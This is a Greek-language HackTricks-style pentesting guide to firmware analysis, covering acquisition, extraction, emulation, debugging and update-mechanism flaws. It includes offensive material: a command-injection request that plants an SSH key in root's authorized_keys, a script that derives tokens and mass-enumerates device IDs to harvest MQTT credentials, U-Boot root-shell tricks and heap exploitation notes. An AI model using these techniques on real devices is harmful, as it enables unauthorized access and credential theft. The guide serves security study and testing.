# Ανάλυση Firmware

{{#include ../../banners/hacktricks-training.md}}

## **Εισαγωγή**

### Σχετικοί πόροι


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware είναι βασικό λογισμικό που επιτρέπει στις συσκευές να λειτουργούν σωστά, διαχειριζόμενο και διευκολύνοντας την επικοινωνία μεταξύ των υλικών συστατικών και του λογισμικού με το οποίο αλληλεπιδρούν οι χρήστες. Αποθηκεύεται σε μόνιμη μνήμη, εξασφαλίζοντας ότι η συσκευή έχει πρόσβαση σε κρίσιμες εντολές από τη στιγμή που δέχεται τροφοδοσία, οδηγώντας στην εκκίνηση του λειτουργικού συστήματος. Η εξέταση και η ενδεχόμενη τροποποίηση του firmware είναι κρίσιμο βήμα για τον εντοπισμό ευπαθειών ασφαλείας.

## **Συλλογή Πληροφοριών**

Η συλλογή πληροφοριών είναι ένα κρίσιμο αρχικό βήμα για την κατανόηση της σύνθεσης μιας συσκευής και των τεχνολογιών που χρησιμοποιεί. Αυτή η διαδικασία περιλαμβάνει τη συγκέντρωση δεδομένων σχετικά με:

- Την αρχιτεκτονική CPU και το λειτουργικό σύστημα που τρέχει
- Στοιχεία του Bootloader
- Διάταξη υλικού και datasheets
- Μετρικές της βάσης κώδικα και θέσεις του source
- Εξωτερικές βιβλιοθήκες και τύπους αδειών
- Ιστορικά ενημερώσεων και ρυθμιστικές πιστοποιήσεις
- Αρχιτεκτονικά και διαγράμματα ροής
- Αξιολογήσεις ασφάλειας και εντοπισμένες ευπάθειες

Για αυτόν τον σκοπό, τα εργαλεία **open-source intelligence (OSINT)** είναι ανεκτίμητα, όπως και η ανάλυση τυχόν διαθέσιμων open-source software components μέσω χειροκίνητης και αυτοματοποιημένης αναθεώρησης. Εργαλεία όπως [Coverity Scan](https://scan.coverity.com) και [Semmle’s LGTM](https://lgtm.com/#explore) προσφέρουν δωρεάν static analysis που μπορούν να αξιοποιηθούν για να εντοπίσουν πιθανά ζητήματα.

## **Προμήθεια του Firmware**

Η απόκτηση firmware μπορεί να προσεγγιστεί με διάφορους τρόπους, καθένας με το δικό του επίπεδο πολυπλοκότητας:

- **Απευθείας** από την πηγή (developers, manufacturers)
- **Κατασκευή** του από τις παρεχόμενες οδηγίες
- **Λήψη** από επίσημους ιστότοπους υποστήριξης
- Χρήση **Google dork** queries για εύρεση φιλοξενούμενων αρχείων firmware
- Πρόσβαση σε **cloud storage** απευθείας, με εργαλεία όπως [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Παρεμβολή σε **updates** μέσω man-in-the-middle τεχνικών
- **Εξαγωγή** από τη συσκευή μέσω συνδέσεων όπως **UART**, **JTAG**, ή **PICit**
- **Ανάκτηση** αιτημάτων ενημέρωσης μέσα από την επικοινωνία της συσκευής
- Εντοπισμός και χρήση **hardcoded update endpoints**
- **Dumping** από τον bootloader ή το δίκτυο
- **Αφαίρεση και ανάγνωση** του storage chip, όταν όλα τα άλλα αποτύχουν, με χρήση κατάλληλων hardware εργαλείων

### UART-only logs: force a root shell via U-Boot env in flash

Αν το UART RX αγνοείται (μόνο logs), μπορείτε να εξαναγκάσετε ένα init shell επεξεργαζόμενοι το **U-Boot environment blob** offline:

1. Dump SPI flash με ένα SOIC-8 clip + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Εντοπίστε το U-Boot env partition, επεξεργαστείτε τα `bootargs` για να συμπεριλάβετε `init=/bin/sh`, και **επαναυπολογίστε το U-Boot env CRC32** για το blob.
3. Reflash μόνο το env partition και κάντε reboot· ένα shell θα πρέπει να εμφανιστεί στο UART.

Αυτό είναι χρήσιμο σε embedded συσκευές όπου το shell του bootloader είναι απενεργοποιημένο αλλά το env partition είναι εγγράψιμο μέσω εξωτερικής πρόσβασης στο flash.

## Ανάλυση του firmware

Τώρα που **έχετε το firmware**, πρέπει να εξάγετε πληροφορίες γι' αυτό για να γνωρίζετε πώς να το χειριστείτε. Διάφορα εργαλεία που μπορείτε να χρησιμοποιήσετε για αυτό:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Εάν δεν βρείτε πολλά με αυτά τα εργαλεία, ελέγξτε την **εντροπία** της εικόνας με `binwalk -E <bin>`, αν η εντροπία είναι χαμηλή, τότε δεν είναι πιθανό να είναι κρυπτογραφημένη. Αν η εντροπία είναι υψηλή, πιθανόν να είναι κρυπτογραφημένη (ή συμπιεσμένη με κάποιον τρόπο).

Επιπλέον, μπορείτε να χρησιμοποιήσετε αυτά τα εργαλεία για να εξαγάγετε **αρχεία ενσωματωμένα μέσα στο firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ή [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) για να επιθεωρήσετε το αρχείο.

### Απόκτηση του filesystem

Με τα προηγουμένως αναφερθέντα εργαλεία όπως `binwalk -ev <bin>` θα έπρεπε να έχετε καταφέρει να **εξαγάγετε το filesystem**.\
Binwalk συνήθως το εξάγει μέσα σε έναν **φάκελο ονομασμένο σαν τον τύπο του filesystem**, που συνήθως είναι ένας από τους εξής: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Χειροκίνητη εξαγωγή του filesystem

Καμιά φορά, binwalk δεν θα έχει το magic byte του filesystem στις signatures του. Σε αυτές τις περιπτώσεις, χρησιμοποιήστε binwalk για να βρείτε το offset του filesystem και να carve το συμπιεσμένο filesystem από το binary και να εξαγάγετε χειροκίνητα το filesystem σύμφωνα με τον τύπο του χρησιμοποιώντας τα παρακάτω βήματα.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Εκτελέστε την ακόλουθη εντολή **dd** για carving του Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Εναλλακτικά, η παρακάτω εντολή μπορεί επίσης να εκτελεστεί.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Για squashfs (όπως χρησιμοποιήθηκε στο παραπάνω παράδειγμα)

`$ unsquashfs dir.squashfs`

Τα αρχεία θα βρίσκονται στον φάκελο `squashfs-root` στη συνέχεια.

- Για αρχεία CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Για jffs2 συστήματα αρχείων

`$ jefferson rootfsfile.jffs2`

- Για ubifs συστήματα αρχείων με NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Ανάλυση Firmware

Μόλις αποκτηθεί το firmware, είναι απαραίτητο να το εξετάσουμε προσεκτικά για να κατανοήσουμε τη δομή του και τις πιθανές ευπάθειες. Η διαδικασία αυτή περιλαμβάνει τη χρήση διαφόρων εργαλείων για την ανάλυση και εξαγωγή χρήσιμων δεδομένων από την εικόνα του firmware.

### Εργαλεία αρχικής ανάλυσης

Παρέχεται ένα σύνολο εντολών για την αρχική επιθεώρηση του binary αρχείου (αναφερόμενου ως `<bin>`). Οι εντολές αυτές βοηθούν στον εντοπισμό τύπων αρχείων, στην εξαγωγή των strings, στην ανάλυση των δυαδικών δεδομένων και στην κατανόηση των λεπτομερειών των διαμερισμάτων και των συστημάτων αρχείων:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Για να αξιολογηθεί η κατάσταση κρυπτογράφησης της εικόνας, ελέγχεται η **entropy** με `binwalk -E <bin>`. Χαμηλή entropy υποδηλώνει έλλειψη κρυπτογράφησης, ενώ υψηλή entropy δείχνει πιθανή κρυπτογράφηση ή συμπίεση.

Για την εξαγωγή των **ενσωματωμένων αρχείων**, συνιστώνται εργαλεία και πόροι όπως η τεκμηρίωση **file-data-carving-recovery-tools** και το **binvis.io** για επιθεώρηση αρχείων.

### Extracting the Filesystem

Χρησιμοποιώντας `binwalk -ev <bin>`, συνήθως μπορείτε να εξαγάγετε το σύστημα αρχείων, συχνά σε έναν κατάλογο ονομασμένο ανάλογα με τον τύπο του filesystem (π.χ. squashfs, ubifs). Ωστόσο, όταν το **binwalk** δεν αναγνωρίσει τον τύπο του filesystem λόγω απουσίας magic bytes, απαιτείται χειροκίνητη εξαγωγή. Αυτό περιλαμβάνει τη χρήση `binwalk` για τον εντοπισμό του offset του filesystem, ακολουθούμενη από την εντολή `dd` για να αποκόψετε το filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Στη συνέχεια, ανάλογα με τον τύπο του συστήματος αρχείων (π.χ. squashfs, cpio, jffs2, ubifs), χρησιμοποιούνται διαφορετικές εντολές για την χειροκίνητη εξαγωγή του περιεχομένου.

### Ανάλυση Συστήματος Αρχείων

Με το σύστημα αρχείων εξαγμένο, ξεκινά η αναζήτηση για ευπάθειες ασφαλείας. Δίνεται προσοχή σε insecure network daemons, hardcoded credentials, API endpoints, update server λειτουργίες, uncompiled code, startup scripts και compiled binaries για offline ανάλυση.

**Σημαντικές τοποθεσίες** και **στοιχεία** προς έλεγχο περιλαμβάνουν:

- **etc/shadow** και **etc/passwd** για διαπιστευτήρια χρηστών
- Πιστοποιητικά SSL και κλειδιά στο **etc/ssl**
- Αρχεία ρυθμίσεων και script για πιθανές ευπάθειες
- Ενσωματωμένα binaries για περαιτέρω ανάλυση
- Συνηθισμένοι web servers συσκευών IoT και binaries

Πολλά εργαλεία βοηθούν στον εντοπισμό ευαίσθητων πληροφοριών και ευπαθειών εντός του filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) και [**Firmwalker**](https://github.com/craigz28/firmwalker) για αναζήτηση ευαίσθητων πληροφοριών
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) για ολοκληρωμένη ανάλυση firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), και [**EMBA**](https://github.com/e-m-b-a/emba) για static και dynamic analysis

### Έλεγχοι Ασφαλείας σε Compiled Binaries

Τόσο ο source code όσο και τα compiled binaries που βρέθηκαν στο filesystem πρέπει να ελεγχθούν προσεκτικά για ευπάθειες. Εργαλεία όπως το **checksec.sh** για Unix binaries και το **PESecurity** για Windows binaries βοηθούν στον εντοπισμό ανεπαρκώς προστατευμένων binaries που θα μπορούσαν να αξιοποιηθούν.

## Εξαγωγή cloud config και MQTT credentials μέσω παραγόμενων URL tokens

Πολλά IoT hubs αντλούν τη ρύθμιση ανά συσκευή από ένα cloud endpoint που μοιάζει με:

- `https://<api-host>/pf/<deviceId>/<token>`

Κατά την ανάλυση firmware μπορεί να διαπιστώσετε ότι το `<token>` προκύπτει τοπικά από το device ID χρησιμοποιώντας ένα hardcoded secret, για παράδειγμα:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Αυτός ο σχεδιασμός επιτρέπει σε οποιονδήποτε μάθει ένα deviceId και το STATIC_KEY να ανακατασκευάσει το URL και να τραβήξει το cloud config, συχνά αποκαλύπτοντας plaintext MQTT credentials και topic prefixes.

Πρακτική ροή εργασίας:

1) Εξαγωγή του deviceId από UART boot logs

- Συνδέστε έναν 3.3V UART adapter (TX/RX/GND) και καταγράψτε τα logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Αναζητήστε γραμμές που εκτυπώνουν το cloud config URL pattern και το broker address, για παράδειγμα:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Ανάκτηση του STATIC_KEY και του αλγορίθμου token από το firmware

- Φορτώστε τα binaries στο Ghidra/radare2 και αναζητήστε το config path ("/pf/") ή χρήση MD5.
- Επιβεβαιώστε τον αλγόριθμο (π.χ., MD5(deviceId||STATIC_KEY)).
- Εξαγάγετε το token με Bash και μετατρέψτε το digest σε κεφαλαία:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Συλλογή cloud config και MQTT credentials

- Σύνθεσε το URL και τράβηξε το JSON με curl; ανέλυσε με jq για να εξάγεις secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Εκμετάλλευση plaintext MQTT και weak topic ACLs (εφόσον υπάρχουν)

- Χρησιμοποίησε ανακτημένα credentials για να subscribe σε maintenance topics και να αναζητήσεις sensitive events:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Απαριθμήστε προβλέψιμα device IDs (σε μεγάλη κλίμακα, με εξουσιοδότηση)

- Πολλά οικοσυστήματα ενσωματώνουν bytes vendor OUI/product/type, ακολουθούμενα από ένα διαδοχικό επίθημα.
- Μπορείτε να διατρέξετε υποψήφια IDs, να εξάγετε tokens και να ανακτήσετε configs προγραμματιστικά:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Σημειώσεις
- Πάντα να λαμβάνετε ρητή εξουσιοδότηση πριν επιχειρήσετε mass enumeration.
- Προτιμήστε emulation ή static analysis για να ανακτήσετε secrets χωρίς να τροποποιήσετε το target hardware όταν είναι δυνατόν.


Η διαδικασία emulating firmware επιτρέπει **dynamic analysis** είτε της λειτουργίας μιας συσκευής είτε ενός μεμονωμένου προγράμματος. Αυτή η προσέγγιση μπορεί να αντιμετωπίσει προβλήματα λόγω εξαρτήσεων από hardware ή την architecture, αλλά η μεταφορά του root filesystem ή συγκεκριμένων binaries σε μια συσκευή με συμβατή architecture και endianness, όπως ένα Raspberry Pi, ή σε μια pre-built virtual machine, μπορεί να διευκολύνει περαιτέρω testing.

### Emulating Individual Binaries

Για την εξέταση μεμονωμένων προγραμμάτων, είναι κρίσιμο να προσδιοριστεί το endianness και η CPU architecture του προγράμματος.

#### Παράδειγμα με MIPS Architecture

Για να emulate ένα MIPS architecture binary, μπορείτε να χρησιμοποιήσετε την εντολή:
```bash
file ./squashfs-root/bin/busybox
```
Και για να εγκαταστήσετε τα απαραίτητα εργαλεία εξομοίωσης:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Για MIPS (big-endian) χρησιμοποιείται το `qemu-mips`, ενώ για little-endian binaries η επιλογή είναι το `qemu-mipsel`.

#### ARM Architecture Emulation

Για ARM binaries η διαδικασία είναι παρόμοια, με τον emulator `qemu-arm` να χρησιμοποιείται για emulation.

### Full System Emulation

Εργαλεία όπως [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) και άλλα διευκολύνουν την πλήρη emulation του firmware, αυτοματοποιώντας τη διαδικασία και βοηθώντας στη δυναμική ανάλυση.

## Dynamic Analysis in Practice

Σε αυτό το στάδιο χρησιμοποιείται είτε πραγματικό είτε εξομοιωμένο περιβάλλον συσκευής για την ανάλυση. Είναι απαραίτητο να διατηρείται πρόσβαση σε shell στο OS και στο filesystem. Η εξομοίωση ενδέχεται να μην μιμείται τέλεια τις αλληλεπιδράσεις με το hardware, κάτι που μπορεί να απαιτεί περιστασιακές επανεκκινήσεις της εξομοίωσης. Η ανάλυση πρέπει να επανεξετάσει το filesystem, να εκμεταλλευτεί εκτεθειμένες webpages και network services, και να εξερευνήσει ευπάθειες του bootloader. Τα tests ακεραιότητας του firmware είναι κρίσιμα για τον εντοπισμό πιθανών backdoor vulnerabilities.

## Runtime Analysis Techniques

Η runtime ανάλυση περιλαμβάνει αλληλεπίδραση με μια διαδικασία ή binary στο λειτουργικό της περιβάλλον, χρησιμοποιώντας εργαλεία όπως gdb-multiarch, Frida, και Ghidra για την τοποθέτηση breakpoints και την αναγνώριση vulnerabilities μέσω fuzzing και άλλων τεχνικών.

Για embedded targets χωρίς πλήρες debugger, **copy a statically-linked `gdbserver`** στη συσκευή και συνδεθείτε απομακρυσμένα:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
## Εκμετάλλευση Δυαδικών και Proof-of-Concept

Η ανάπτυξη ενός PoC για εντοπισμένες ευπάθειες απαιτεί βαθιά κατανόηση της αρχιτεκτονικής στόχου και προγραμματισμό σε χαμηλού επιπέδου γλώσσες. Οι binary runtime protections σε ενσωματωμένα συστήματα είναι σπάνιες, αλλά όταν υπάρχουν, τεχνικές όπως Return Oriented Programming (ROP) μπορεί να είναι απαραίτητες.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc χρησιμοποιεί fastbins παρόμοια με glibc. Μια μεταγενέστερη μεγάλη κατανομή μπορεί να ενεργοποιήσει `__malloc_consolidate()`, οπότε οποιοδήποτε ψεύτικο chunk πρέπει να περάσει τους ελέγχους (λογικό μέγεθος, `fd = 0`, και τα περιβάλλοντα chunks να φαίνονται ως "in use").
- **Non-PIE binaries under ASLR:** αν το ASLR είναι ενεργοποιημένο αλλά το κύριο binary είναι **non-PIE**, οι διευθύνσεις στα `.data/.bss` μέσα στο binary είναι σταθερές. Μπορείτε να στοχεύσετε μια περιοχή που ήδη μοιάζει με έγκυρο heap chunk header για να προσγειώσετε μια fastbin allocation πάνω σε έναν **function pointer table**.
- **Parser-stopping NUL:** όταν γίνεται parsing JSON, ένα `\x00` στο payload μπορεί να σταματήσει το parser ενώ διατηρεί τα επακόλουθα bytes υπό τον έλεγχο του επιτιθέμενου για ένα stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** ένα ROP chain που καλεί `open("/proc/self/mem")`, `lseek()`, και `write()` μπορεί να φυτεύσει εκτελέσιμο shellcode σε ένα γνωστό mapping και να κάνει jump σε αυτό.

## Prepared Operating Systems for Firmware Analysis

Λειτουργικά συστήματα όπως [AttifyOS](https://github.com/adi0x90/attifyos) και [EmbedOS](https://github.com/scriptingxss/EmbedOS) παρέχουν προ-ρυθμισμένα περιβάλλοντα για ανάλυση firmware, εξοπλισμένα με τα απαραίτητα εργαλεία.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): Το AttifyOS είναι μια διανομή σχεδιασμένη να σας βοηθήσει να πραγματοποιήσετε security assessment και penetration testing συσκευών Internet of Things (IoT). Σας γλιτώνει πολύ χρόνο προσφέροντας ένα προ-ρυθμισμένο περιβάλλον με όλα τα απαραίτητα εργαλεία.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system βασισμένο σε Ubuntu 18.04, προφορτωμένο με εργαλεία για firmware security testing.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Ακόμη και όταν ένας vendor εφαρμόζει cryptographic signature checks για εικόνες firmware, η προστασία κατά της version rollback (downgrade) συχνά παραλείπεται. Όταν ο boot- ή recovery-loader ελέγχει μόνο την υπογραφή με ένα ενσωματωμένο public key αλλά δεν συγκρίνει την *έκδοση* (ή έναν monotonic counter) της εικόνας που γίνεται flash, ένας επιτιθέμενος μπορεί νόμιμα να εγκαταστήσει ένα **παλαιότερο, ευπαθές firmware που εξακολουθεί να φέρει έγκυρη υπογραφή** και να επανεισάγει διορθωμένες ευπάθειες.

Τυπικό workflow επίθεσης:

1. **Απόκτηση μιας παλαιότερης υπογεγραμμένης εικόνας**
* Λήψη από το δημόσιο portal του vendor, CDN ή site υποστήριξης.
* Εξαγωγή από συνοδευτικές mobile/desktop εφαρμογές (π.χ. μέσα σε ένα Android APK κάτω από `assets/firmware/`).
* Ανάκτηση από τρίτες αποθετήρια όπως VirusTotal, αρχεία Internet, φόρουμ, κ.λπ.
2. **Ανέβασμα ή σερβίρισμα της εικόνας στη συσκευή** μέσω οποιουδήποτε εκτεθειμένου καναλιού ενημέρωσης:
* Web UI, mobile-app API, USB, TFTP, MQTT, κ.λπ.
* Πολλές καταναλωτικές IoT συσκευές εκθέτουν *unauthenticated* HTTP(S) endpoints που δέχονται Base64-encoded firmware blobs, τα αποκωδικοποιούν server-side και ενεργοποιούν recovery/upgrade.
3. Μετά το downgrade, εκμεταλλευτείτε μια ευπάθεια που είχε ψηθεί (patched) στην νεότερη έκδοση (για παράδειγμα ένα filter για command-injection που προστέθηκε αργότερα).
4. Προαιρετικά, κάντε flash την πιο πρόσφατη εικόνα ξανά ή απενεργοποιήστε τις ενημερώσεις για να αποφύγετε την ανίχνευση μόλις αποκτηθεί persistence.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Στο ευάλωτο (downgraded) firmware, η παράμετρος `md5` συνενώνεται απευθείας σε μία εντολή shell χωρίς καθαρισμό εισόδου, επιτρέποντας injection αυθαίρετων εντολών (εδώ — enabling SSH key-based root access). Αργότερες εκδόσεις του firmware εισήγαγαν έναν βασικό φίλτρο χαρακτήρων, αλλά η απουσία προστασίας κατά του downgrade καθιστά την επιδιόρθωση άνευ σημασίας.

### Εξαγωγή firmware από mobile εφαρμογές

Πολλοί προμηθευτές πακετάρουν πλήρεις εικόνες firmware μέσα στις συνοδευτικές mobile εφαρμογές τους, ώστε η εφαρμογή να μπορεί να ενημερώσει τη συσκευή μέσω Bluetooth/Wi‑Fi. Αυτά τα πακέτα συνήθως αποθηκεύονται μη κρυπτογραφημένα στο APK/APEX κάτω από διαδρομές όπως `assets/fw/` ή `res/raw/`. Εργαλεία όπως `apktool`, `ghidra`, ή ακόμη και απλό `unzip` σας επιτρέπουν να τραβήξετε signed images χωρίς να αγγίξετε το physical hardware.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Λίστα ελέγχου για την αξιολόγηση της λογικής ενημέρωσης

* Είναι η μεταφορά/authentication του *update endpoint* επαρκώς προστατευμένη (TLS + authentication)?
* Συγκρίνει η συσκευή **version numbers** ή έναν **monotonic anti-rollback counter** πριν το flashing?
* Επαληθεύεται το image μέσα σε secure boot chain (π.χ. signatures checked by ROM code)?
* Εκτελεί το userland code επιπλέον sanity checks (π.χ. allowed partition map, model number)?
* Επαναχρησιμοποιούν οι *partial* ή *backup* update flows την ίδια validation logic?

> 💡  If any of the above are missing, the platform is probably vulnerable to rollback attacks.

## Ευάλωτο firmware για εξάσκηση

Για να εξασκηθείτε στην ανακάλυψη ευπαθειών σε firmware, χρησιμοποιήστε τα ακόλουθα vulnerable firmware projects ως αφετηρία.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Εκπαίδευση και Πιστοποίηση

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## Αναφορές

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)

{{#include ../../banners/hacktricks-training.md}}
